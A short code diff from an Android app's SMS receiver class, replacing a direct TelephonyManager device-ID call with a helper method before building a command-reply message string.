@@ -139,8 +139,8 @@ public class SMSReceiver extends BroadcastReceiver {
 		if (c!=null) {
 			String sysTime = String.valueOf(System.currentTimeMillis()/1000);
 			TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
-			String devId = telephonyManager.getDeviceId();
-			
+//			String devId = telephonyManager.getDeviceId();
+			String devId = Master.getDevId2(context);
 			
 			String message = Master.CMD_ACUS + " " +
 					devId 				+ ";" +
